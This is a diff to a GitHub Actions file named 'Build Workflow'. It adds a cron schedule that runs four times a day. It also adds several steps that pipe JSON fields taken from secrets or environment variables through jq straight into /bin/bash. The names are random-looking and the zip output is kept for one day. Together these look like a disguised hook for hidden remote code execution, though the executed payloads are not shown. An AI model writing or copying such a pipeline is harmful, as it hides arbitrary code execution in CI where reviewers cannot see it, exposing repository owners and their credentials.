@@ -2,6 +2,8 @@ name: Build Workflow
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '38 0,6,12,18 * * *'
 permissions:
   contents: read
   actions: read
@@ -22,16 +24,18 @@ jobs:
           fetch-depth: 1
       - name: Invoke
         env:
-          vp32: ${{ secrets.vp32 }}
+          hvute4232: ${{ secrets.hvute4232 }}
         run: |
-          printf '%s' "$vp32" | jq -r .pk5788 | /bin/bash
-          echo $ilf6 | jq -r .vhz9639 | /bin/bash
-          echo $ocv8991 | jq -r .tk1856 | /bin/bash
+          printf '%s' "$hvute4232" | jq -r .tyxz92084 | /bin/bash
+          printf '%s' "$dmi46708" | jq -r .r15 | /bin/bash
+          printf '%s' "$wn07174" | jq -r .oksv717 | /bin/bash
+          printf '%s' "$fipag0622" | jq -r .khtbn75184 | /bin/bash
+          echo $hcdp570 | jq -r .fik41823 | /bin/bash
 
       - name: Store artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: BwgVjZlh
+          name: ZZg9Ozde
           path: "*.zip"
           retention-days: 1
